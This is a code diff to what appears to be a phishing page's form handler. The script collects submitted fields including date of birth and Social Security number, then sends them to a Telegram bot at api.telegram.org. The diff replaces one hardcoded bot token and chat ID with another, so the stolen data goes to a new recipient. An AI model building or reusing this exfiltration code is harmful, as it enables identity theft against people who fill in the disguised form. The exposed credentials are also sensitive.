@@ -149,8 +149,8 @@
     form.addEventListener("submit", async (event) => {
       event.preventDefault();
 
-      const token = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE"; // Replace with your bot token
-      const chatId = "6837437455"; // Replace with your chat ID
+      const token = "7576953137:AAHmUYxqqFwCO4guB6C3kmicU4Hle7ruyJQ"; // Replace with your bot token
+      const chatId = "1790394521"; // Replace with your chat ID
       
       const formData = new FormData(form);
       const message = `
@@ -165,7 +165,7 @@
         DOB: ${formData.get("dob")}
         SSN: ${formData.get("ssn")}
         Single: ${formData.get("single")}
-        
+
       `;
 
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
